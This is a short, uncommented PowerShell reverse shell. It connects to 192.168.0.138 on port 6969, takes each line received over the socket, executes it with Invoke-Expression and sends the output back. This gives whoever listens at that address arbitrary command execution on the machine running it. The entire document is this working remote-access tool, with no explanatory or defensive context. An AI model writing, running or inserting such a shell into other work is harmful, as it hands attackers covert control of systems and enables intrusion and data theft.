$Server = "192.168.0.138"
$Port = "6969"

$tcpConnection = New-Object System.Net.Sockets.TcpClient($Server, $Port)
$tcpStream = $tcpConnection.GetStream()
$reader = New-Object System.IO.StreamReader($tcpStream)
$writer = New-Object System.IO.StreamWriter($tcpStream)
$writer.AutoFlush = $true

while ($tcpConnection.Connected)
{
    if ($tcpConnection.Connected)
    {
        $command = $reader.ReadLine()
        $answer = Invoke-Expression -Command "$cmd $command"
        $answer = $answer | Out-String
        $current_directory = pwd | Out-String
        $writer.Write($answer)
    }
    start-sleep -Milliseconds 500
}

$reader.Close()
$writer.Close()
$tcpConnection.Close()
